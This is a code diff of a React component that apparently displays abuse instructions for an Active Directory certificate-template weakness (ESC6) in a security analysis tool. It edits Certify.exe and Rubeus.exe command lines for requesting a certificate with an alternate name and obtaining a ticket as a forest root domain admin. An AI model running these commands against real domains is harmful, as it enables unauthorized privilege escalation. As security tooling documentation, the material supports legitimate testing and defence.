@@ -27,7 +27,7 @@ const WindowsAbuse: FC = () => {
             </Typography>
             <Typography component={'pre'}>
                 {
-                    '.\\Certify.exe request /ca:rootdomaindc.forestroot.com\forestroot-RootDomainDC-CA /template:ESC6 /altname:forestroot\\ForestRootDA'
+                    '.\\Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:ESC6 /altname:forestroot\\ForestRootDA'
                 }
             </Typography>
             <Typography variant='body2'>
@@ -38,7 +38,13 @@ const WindowsAbuse: FC = () => {
                 <b>Step 3</b>: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the
                 target identity to impersonate and the PFX-formatted certificate created in Step 2:
             </Typography>
-            <Typography component={'pre'}>{'certutil.exe -MergePFX .cert.pem .cert.pfx\n' + 'klist'}</Typography>
+            <Typography component={'pre'}>
+                {'.\\Rubeus.exe asktgt /certificate:cert.pfx /user:”forestroot\\forestrootda” /password:asdf /ptt'}
+            </Typography>
+            <Typography variant='body2'>
+                <b>Step 4</b>: Optionally verify the TGT by listing it with the klist command:
+            </Typography>
+            <Typography component={'pre'}>{'klist'}</Typography>
         </>
     );
 };
